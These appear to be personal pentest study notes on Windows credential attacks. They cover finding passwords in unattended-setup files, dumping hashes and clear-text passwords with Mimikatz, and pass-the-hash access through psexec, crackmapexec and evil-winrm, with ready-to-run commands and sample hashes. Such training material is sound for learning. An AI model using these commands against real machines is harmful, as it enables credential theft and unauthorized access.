##   Windows Password Hashes
![](</Images/Pasted image 20231207191612.png>)

## Searching for Passwords in Config Files
![](</Images/Pasted image 20231207192851.png>)
Unattended Windows Setup util utilizes one of the following files that contain user and system config info
>C:\\Windows\\Panther\\Unattend.xml
>C:\\Windows\\Panther\\Autounattend.xml

## Dumping Hashes With Mimikatz
Post exploitation tool. Extracts clear-text passwords, hashes, and kerberos tickets from memory.

Can use Kiwi via meterpreter. After gaining meterpretper use `load kiwi` then ? for options

Otherwise can upload the program from `/usr/share/windows-resources/mimikatz/x64/minikatz.exe -> minikatz.exe`

When running mimikatz directly, check privs via `privilege::debug`
> Check for OK response

Commands are different than metasploit. 
Ex. to dump sam use `lsadump::sam`

sekurlsa::logonpasswords will show clear text passwords if available.

### Pass the Hash Attack
Can use #psexec or #crackmapexec 
Can still get access using hash even if expoit has been fixed

pgrep lsass for SYSTEM

### psexec
(hasdump with kiwi)
Need LM hash and NTML user hash

#blanklmhash 
Sometimes a blank LM hash is needed. 
```
aad3b435b51404eeaad3b435b51404ee
```



>metasploit exploit/windows/smb/psexec <- doesn't always work right aware. Need to play with the target via `set target`
>set SMPass with the user LM:NTLM hash

### crackmapexec <- no longer maintained (broken sometimes)
```
crackmapexec smb <ip> -u <user> -H "<ntml hash only>"
```

 > add -x for executing commands

### EvilWinRM
```
evil-winrm -i MACHINE_IP -u Administrator -H F138C405BD9F3139994E220CE0212E7C
```
